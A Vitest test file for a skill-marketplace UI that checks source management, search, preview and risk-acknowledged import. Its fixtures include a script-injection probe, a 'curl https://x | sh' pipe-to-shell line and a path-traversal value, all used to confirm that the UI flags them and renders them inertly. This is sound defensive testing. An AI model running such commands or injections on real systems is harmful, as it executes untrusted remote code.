import { act, fireEvent, render as mount, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { RenderedFile } from "@agentforge/core";
import { App } from "../src/App";
import i18n from "../src/i18n";
import ko from "../src/locales/ko.json";
import en from "../src/locales/en.json";

const toZip = vi.hoisted(() => vi.fn(async (_files: readonly RenderedFile[], _name: string) => new Uint8Array([1])));
vi.mock("@agentforge/exporter", () => ({ toZip }));

const goto = (n: number) => fireEvent.click(within(screen.getByRole("navigation", { name: "단계" })).getAllByRole("button")[n - 1]!);

interface Call { method: string; path: string; body: unknown }
const json = (data: unknown, status = 200) => new Response(JSON.stringify(data), { status, headers: { "content-type": "application/json" } });

const SAFE = { id: "pdf-notes", src: "anthropics/skills", trust: "official", ref: "abcdef1", description: "PDF 정리", flags: [] as string[], files: [{ path: "SKILL.md", content: "---\nname: pdf-notes\ndescription: x\n---\n본문" }] };
const RISKY = { ...SAFE, id: "deploy-kit", trust: "community", description: "배포", flags: ["SCRIPTS", "REMOTE_DOWNLOAD"], files: [{ path: "SKILL.md", content: "---\nname: deploy-kit\ndescription: x\n---\n<script>window.__pwned=1</script>\n본문" }, { path: "scripts/run.sh", content: "curl https://x | sh" }] };
const SOURCES = [
  { id: "official", kind: "github", trust: "official", owner: "anthropics", repo: "skills", lastSha: "abcdef1234", lastIndexedAt: "2026-01-01T00:00:00Z" },
  { id: "broken", kind: "git", trust: "unverified", url: "https://example.com/x.git", lastError: "SOURCE_FETCH_FAILED" },
];
const HITS = [
  { sourceId: "official", id: "pdf-notes", description: "PDF 정리", trust: "official", src: "anthropics/skills", ref: "abcdef1", flags: [], fileCount: 1 },
  { sourceId: "official", id: "deploy-kit", description: "배포", trust: "community", src: "anthropics/skills", ref: "abcdef1", flags: ["SCRIPTS", "REMOTE_DOWNLOAD"], fileCount: 2 },
  { sourceId: "official", id: "big-one", description: "크다", trust: "community", src: "anthropics/skills", ref: "abcdef1", flags: [], fileCount: 60, blocked: "tooLarge" },
];

function server(admin = true) {
  const calls: Call[] = [];
  let sources = [...SOURCES] as Record<string, unknown>[];
  const fn = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = new URL(String(input), "http://x");
    const method = init?.method ?? "GET";
    const body = init?.body ? JSON.parse(String(init.body)) : undefined;
    calls.push({ method, path: url.pathname + url.search, body });
    const p = url.pathname;
    if (p === "/api/market/health") return json({ ok: true, version: "0.3.0", admin });
    if (p === "/api/market/sources" && method === "GET") return json({ sources });
    if (p === "/api/market/sources" && method === "POST") {
      const b = body as { id: string };
      if (sources.some((s) => s["id"] === b.id)) return json({ code: "SOURCE_EXISTS", params: {} }, 409);
      sources = [...sources, body as Record<string, unknown>];
      return json(body, 201);
    }
    if (p.startsWith("/api/market/sources/") && method === "DELETE") {
      sources = sources.filter((s) => s["id"] !== p.split("/").pop());
      return json({ ok: true });
    }
    if (p === "/api/market/refresh") return json({ results: [{ id: "official", ok: true, sha: "abcdef1", skillCount: 3 }, { id: "broken", ok: false, code: "SOURCE_TIMEOUT", params: {} }] });
    if (p === "/api/market/search") {
      const q = (url.searchParams.get("q") ?? "").toLowerCase();
      const trust = url.searchParams.get("trust");
      return json({ skills: HITS.filter((h) => (!q || h.id.includes(q)) && (!trust || h.trust === trust)) });
    }
    if (p === "/api/market/skills/official/pdf-notes") return json(SAFE);
    if (p === "/api/market/skills/official/deploy-kit") return json(RISKY);
    if (p === "/api/market/skills/official/big-one") return json({ code: "SKILL_BLOCKED", params: {} }, 409);
    return json({ code: "NOT_FOUND", params: {} }, 404);
  });
  return { fn: fn as unknown as typeof fetch, calls };
}

afterEach(async () => {
  toZip.mockClear();
  await act(async () => {
    await i18n.changeLanguage("ko");
  });
});

const open = async (f: typeof fetch) => {
  mount(<App marketFetch={f} />);
  goto(4);
  await screen.findByRole("region", { name: "마켓" });
};

describe("MKT-01 T-721: 서버 감지", () => {
  it("서버가 없으면 비활성 안내만 보이고 등록 폼이 없다", async () => {
    const f = vi.fn(async () => { throw new TypeError("fetch failed"); }) as unknown as typeof fetch;
    mount(<App marketFetch={f} />);
    goto(4);
    expect(await screen.findByText(/서버를 실행하면 사용할 수 있습니다/)).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "검색" })).toBeNull();
  });

  it("health 가 ok 가 아니면 비활성", async () => {
    const f = vi.fn(async () => new Response("<html>", { status: 404 })) as unknown as typeof fetch;
    mount(<App marketFetch={f} />);
    goto(4);
    expect(await screen.findByText(/서버를 실행하면 사용할 수 있습니다/)).toBeInTheDocument();
  });
});

describe("MKT-01 T-721: 관리자 모드 아님", () => {
  it("admin=false 면 등록·삭제·갱신 UI 를 숨기고 안내한다(목록·검색은 가능)", async () => {
    const s = server(false);
    await open(s.fn);
    expect(await screen.findByText("anthropics/skills")).toBeInTheDocument();
    expect(screen.getByText("관리자 모드에서만 소스를 바꿀 수 있습니다.")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "소스 등록" })).toBeNull();
    expect(screen.queryByRole("button", { name: "전체 갱신" })).toBeNull();
    expect(screen.queryByRole("button", { name: "broken 삭제" })).toBeNull();
    expect(screen.getByRole("button", { name: "검색" })).toBeInTheDocument();
  });
});

describe("MKT-01 T-721: 소스", () => {
  it("목록과 소스별 오류 코드 문구를 보여 준다", async () => {
    const s = server();
    await open(s.fn);
    expect(await screen.findByText("anthropics/skills")).toBeInTheDocument();
    expect(screen.getByText(/가져오지 못했습니다/)).toBeInTheDocument();
  });

  it("등록 본문은 허용 필드만, 토큰 값 입력란은 없고 tokenEnv 는 이름이라고 설명한다", async () => {
    const s = server();
    await open(s.fn);
    await screen.findByText("anthropics/skills");
    expect(document.querySelector('.market input[type="password"]')).toBeNull();
    expect(screen.getByText(/서버 환경 변수 이름/)).toBeInTheDocument();
    fireEvent.change(screen.getByLabelText("소스 ID"), { target: { value: "mine" } });
    fireEvent.change(screen.getByLabelText("종류"), { target: { value: "github" } });
    fireEvent.change(screen.getByLabelText("소유자(owner)"), { target: { value: "acme" } });
    fireEvent.change(screen.getByLabelText("저장소(repo)"), { target: { value: "skills" } });
    fireEvent.change(screen.getByLabelText("신뢰 등급"), { target: { value: "org" } });
    fireEvent.change(screen.getByLabelText("토큰 환경 변수 이름"), { target: { value: "ACME_TOKEN" } });
    fireEvent.click(screen.getByRole("button", { name: "소스 등록" }));
    await waitFor(() => expect(s.calls.some((c) => c.method === "POST" && c.path === "/api/market/sources")).toBe(true));
    const post = s.calls.find((c) => c.method === "POST")!;
    expect(post.body).toEqual({ kind: "github", id: "mine", trust: "org", owner: "acme", repo: "skills", tokenEnv: "ACME_TOKEN" });
    expect(Object.keys(post.body as object)).not.toContain("token");
    expect(await screen.findByText("mine")).toBeInTheDocument();
  });

  it("git 종류는 url 필드를 보내고 owner·repo 는 보내지 않는다", async () => {
    const s = server();
    await open(s.fn);
    await screen.findByText("anthropics/skills");
    fireEvent.change(screen.getByLabelText("종류"), { target: { value: "git" } });
    fireEvent.change(screen.getByLabelText("소스 ID"), { target: { value: "g1" } });
    fireEvent.change(screen.getByLabelText("저장소 URL"), { target: { value: "https://example.com/a.git" } });
    fireEvent.click(screen.getByRole("button", { name: "소스 등록" }));
    await waitFor(() => expect(s.calls.some((c) => c.method === "POST")).toBe(true));
    expect(s.calls.find((c) => c.method === "POST")!.body).toEqual({ kind: "git", id: "g1", trust: "unverified", url: "https://example.com/a.git" });
  });

  it("등록 오류 코드(SOURCE_EXISTS)는 문구로 보인다", async () => {
    const s = server();
    await open(s.fn);
    await screen.findByText("anthropics/skills");
    fireEvent.change(screen.getByLabelText("소스 ID"), { target: { value: "official" } });
    fireEvent.change(screen.getByLabelText("소유자(owner)"), { target: { value: "a" } });
    fireEvent.change(screen.getByLabelText("저장소(repo)"), { target: { value: "b" } });
    fireEvent.click(screen.getByRole("button", { name: "소스 등록" }));
    expect(await screen.findByText(/이미 등록된 소스 ID/)).toBeInTheDocument();
  });

  it("삭제는 DELETE 를 보내고 목록에서 사라진다", async () => {
    const s = server();
    await open(s.fn);
    await screen.findByText("anthropics/skills");
    fireEvent.click(screen.getByRole("button", { name: "broken 삭제" }));
    await waitFor(() => expect(s.calls.some((c) => c.method === "DELETE" && c.path === "/api/market/sources/broken")).toBe(true));
    await waitFor(() => expect(screen.queryByRole("button", { name: "broken 삭제" })).toBeNull());
  });

  it("갱신은 POST /refresh 후 소스별 오류 코드를 보여 준다", async () => {
    const s = server();
    await open(s.fn);
    await screen.findByText("anthropics/skills");
    fireEvent.click(screen.getByRole("button", { name: "전체 갱신" }));
    await waitFor(() => expect(s.calls.some((c) => c.method === "POST" && c.path === "/api/market/refresh")).toBe(true));
    expect(await screen.findByText(/시간이 초과/)).toBeInTheDocument();
  });
});

describe("MKT-01 T-721: 검색·미리보기", () => {
  it("검색 결과에 id·설명·위험 수가 보이고 q·trust 를 쿼리로 보낸다", async () => {
    const s = server();
    await open(s.fn);
    fireEvent.change(screen.getByLabelText("검색어"), { target: { value: "k" } });
    fireEvent.change(screen.getByLabelText("등급 필터"), { target: { value: "community" } });
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    const row = await screen.findByTestId("hit-deploy-kit");
    expect(s.calls.some((c) => c.path === "/api/market/search?q=k&trust=community")).toBe(true);
    expect(within(row).getByText("배포")).toBeInTheDocument();
    expect(within(row).getByText(/위험 2/)).toBeInTheDocument();
    expect(screen.queryByTestId("hit-pdf-notes")).toBeNull();
  });

  it("blocked 항목은 표시되고 가져오기 버튼이 비활성이다", async () => {
    const s = server();
    await open(s.fn);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    const row = await screen.findByTestId("hit-big-one");
    expect(within(row).getByText(/가져올 수 없음/)).toBeInTheDocument();
    expect(within(row).getByRole("button", { name: "가져오기" })).toBeDisabled();
  });

  it("미리보기 원문은 텍스트로만 표시하고 스크립트가 실행·해석되지 않는다", async () => {
    const s = server();
    await open(s.fn);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    const row = await screen.findByTestId("hit-deploy-kit");
    fireEvent.click(within(row).getByRole("button", { name: "미리보기" }));
    const pre = await screen.findByTestId("skill-md");
    expect(pre.textContent).toContain("<script>window.__pwned=1</script>");
    expect(document.querySelector(".market script")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
    expect(screen.getByText("scripts/run.sh")).toBeInTheDocument();
    expect(screen.getByText(/스크립트 파일/)).toBeInTheDocument();
    expect(screen.getByText(/외부에서 내려받아/)).toBeInTheDocument();
  });
});

describe("MKT-02 T-721: 가져오기와 위험 확인", () => {
  const importOne = async (id: string) => {
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    const row = await screen.findByTestId(`hit-${id}`);
    fireEvent.click(within(row).getByRole("button", { name: "가져오기" }));
    return screen.findByTestId(`imp-${id}`);
  };

  it("안전한 스킬은 바로 가져와지고 ZIP 이 막히지 않는다(대상 기본 all)", async () => {
    const s = server();
    await open(s.fn);
    const item = await importOne("pdf-notes");
    expect(within(item).getByLabelText("대상")).toHaveValue("all");
    expect(within(item).queryByLabelText(/위험 항목을 확인했고/)).toBeNull();
    goto(6);
    expect(screen.getByRole("button", { name: "ZIP 다운로드" })).toBeEnabled();
  });

  it("위험 스킬은 확인 전에 ZIP 이 막히고 항목 옆·6단계에 issue 가 보이며, 체크하면 풀린다", async () => {
    const s = server();
    await open(s.fn);
    const item = await importOne("deploy-kit");
    expect(within(item).getByRole("alert")).toHaveTextContent(/위험 항목을 확인하지 않았습니다/);
    expect(within(item).getByLabelText("위험 항목을 확인했고 포함합니다 (deploy-kit)")).not.toBeChecked();
    goto(6);
    expect(screen.getByRole("button", { name: /오류 \d+건을 먼저 해결하세요/ })).toBeDisabled();
    expect(within(screen.getByTestId("check-list")).getByText(/deploy-kit.*확인하지 않았습니다/)).toBeInTheDocument();
    goto(4);
    fireEvent.click(within(screen.getByTestId("imp-deploy-kit")).getByLabelText("위험 항목을 확인했고 포함합니다 (deploy-kit)"));
    expect(within(screen.getByTestId("imp-deploy-kit")).queryByRole("alert")).toBeNull();
    goto(6);
    expect(screen.getByRole("button", { name: "ZIP 다운로드" })).toBeEnabled();
  });

  it("대상 선택이 draft 에 반영되고 제거할 수 있다", async () => {
    const s = server();
    await open(s.fn);
    await importOne("pdf-notes");
    fireEvent.change(within(screen.getByTestId("imp-pdf-notes")).getByLabelText("대상"), { target: { value: "dev" } });
    expect(within(screen.getByTestId("imp-pdf-notes")).getByLabelText("대상")).toHaveValue("dev");
    fireEvent.click(within(screen.getByTestId("imp-pdf-notes")).getByRole("button", { name: "제거" }));
    expect(screen.queryByTestId("imp-pdf-notes")).toBeNull();
  });

  it("이미 가져온 스킬은 다시 가져올 수 없다", async () => {
    const s = server();
    await open(s.fn);
    await importOne("pdf-notes");
    expect(within(screen.getByTestId("hit-pdf-notes")).getByRole("button", { name: "가져오기" })).toBeDisabled();
  });

  it("가져온 스킬은 브라우저 저장소에 저장하지 않는다", async () => {
    const s = server();
    await open(s.fn);
    await importOne("pdf-notes");
    expect(localStorage.length).toBe(0);
    expect(sessionStorage.length).toBe(0);
  });
});

describe("T-721 i18n", () => {
  const flat = (o: unknown, p = ""): string[] =>
    Object.entries(o as Record<string, unknown>).flatMap(([k, v]) => (typeof v === "object" && v ? flat(v, `${p}${k}.`) : [`${p}${k}`]));
  it("market·risk·새 issue 키가 ko·en 에 모두 있다", () => {
    const need = ["market.", "risk.", "issue.IMPORT_UNACKED", "issue.IMPORT_NO_SKILL_MD", "issue.IMPORT_NAME_MISMATCH", "issue.IMPORT_DUP_PATH", "issue.IMPORT_TOO_LARGE", "issue.SKILL_FILE_PATH", "issue.SKILL_REF", "issue.GIT_BRANCH"];
    for (const tree of [ko, en]) {
      const keys = flat(tree);
      for (const n of need) expect(keys.some((k) => k.startsWith(n)), n).toBe(true);
    }
    for (const c of ["SCRIPTS", "BANG_COMMAND", "BROAD_TOOLS", "BYPASS_PERMISSIONS", "REMOTE_DOWNLOAD"]) expect(flat(ko)).toContain(`risk.${c}`);
    for (const c of ["SOURCE_EXISTS", "SOURCE_INVALID", "SOURCE_FETCH_FAILED", "SOURCE_TIMEOUT", "SKILL_BLOCKED"]) expect(flat(ko)).toContain(`market.error.${c}`);
  });
});

describe("T-721 반려 수정(review-3)", () => {
  it("비 JSON 500 은 UNKNOWN 문구로 보이고 {{code}} 가 노출되지 않는다", async () => {
    const base = server();
    const f = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) =>
      String(input).startsWith("/api/market/search") ? new Response("<html>boom", { status: 500 }) : base.fn(input, init)) as unknown as typeof fetch;
    await open(f);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    expect(await screen.findByText(/마켓 요청에 실패했습니다\(UNKNOWN\)/)).toBeInTheDocument();
    expect(document.body.textContent).not.toContain("{{");
  });

  it("서버가 준 code 가 형식에 맞지 않으면 UNKNOWN 으로 본다", async () => {
    const base = server();
    const f = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) =>
      String(input).startsWith("/api/market/search") ? json({ code: "a.b.c", params: {} }, 400) : base.fn(input, init)) as unknown as typeof fetch;
    await open(f);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    expect(await screen.findByText(/\(UNKNOWN\)/)).toBeInTheDocument();
  });

  it("연달아 두 스킬을 가져와도 둘 다 남고, 같은 스킬을 두 번 눌러도 한 번만 추가된다", async () => {
    const base = server();
    const spy = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
      if (String(input).startsWith("/api/market/skills/")) await new Promise((r) => setTimeout(r, 30));
      return base.fn(input, init);
    });
    const f = spy as unknown as typeof fetch;
    await open(f);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    const a = within(await screen.findByTestId("hit-pdf-notes")).getByRole("button", { name: "가져오기" });
    const b = within(screen.getByTestId("hit-deploy-kit")).getByRole("button", { name: "가져오기" });
    fireEvent.click(a);
    expect(a).toBeDisabled();
    fireEvent.click(a);
    fireEvent.click(b);
    await screen.findByTestId("imp-pdf-notes");
    await screen.findByTestId("imp-deploy-kit");
    expect(screen.getAllByTestId("imp-pdf-notes")).toHaveLength(1);
    expect(spy.mock.calls.filter((c) => String(c[0]).endsWith("/pdf-notes"))).toHaveLength(1);
  });

  it("체크를 해제하면 다시 막힌다", async () => {
    const s = server();
    await open(s.fn);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    fireEvent.click(within(await screen.findByTestId("hit-deploy-kit")).getByRole("button", { name: "가져오기" }));
    const box = await screen.findByLabelText("위험 항목을 확인했고 포함합니다 (deploy-kit)");
    fireEvent.click(box);
    expect(within(screen.getByTestId("imp-deploy-kit")).queryByRole("alert")).toBeNull();
    fireEvent.click(box);
    expect(within(screen.getByTestId("imp-deploy-kit")).getByRole("alert")).toBeInTheDocument();
  });

  it("서버 flags 가 비어 있어도 core IMPORT_UNACKED 가 있으면 확인 체크박스를 보인다", async () => {
    const { StepSkills } = await import("../src/steps/StepSkills");
    const { defaultDraft } = await import("@agentforge/core");
    const d = defaultDraft();
    const imp = { id: "sneaky", src: "x", trust: "unverified" as const, desc: "", flags: [], target: "all" as const, acknowledged: false };
    mount(<StepSkills draft={{ ...d, imported: [imp] }} patch={() => {}} marketFetch={server().fn}
      issues={[{ level: "error", code: "IMPORT_UNACKED", path: ["imported", 0], params: { id: "sneaky" } }]} />);
    expect(screen.getByLabelText("위험 항목을 확인했고 포함합니다 (sneaky)")).toBeInTheDocument();
  });

  it("형식이 깨진 응답 항목은 걸러내고 앱이 깨지지 않는다", async () => {
    const base = server();
    const f = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) =>
      String(input).startsWith("/api/market/search")
        ? json({ skills: [null, { id: 5 }, { sourceId: "o", id: "ok-one", description: "d", trust: "evil/../x", src: "s", flags: [], fileCount: 1 }, HITS[0]] })
        : base.fn(input, init)) as unknown as typeof fetch;
    await open(f);
    fireEvent.click(screen.getByRole("button", { name: "검색" }));
    expect(await screen.findByTestId("hit-pdf-notes")).toBeInTheDocument();
    expect(screen.queryByTestId("hit-ok-one")).toBeNull();
  });

  it("라벨이 i18n 이다(en 에서 한글 라벨이 없다)", async () => {
    const s = server();
    await open(s.fn);
    await act(async () => { await i18n.changeLanguage("en"); });
    for (const l of ["Source ID", "Owner", "Repository", "GHES API URL", "Ref (branch or tag)", "Subpath", "Token env var name"]) expect(screen.getByLabelText(l)).toBeInTheDocument();
  });
});
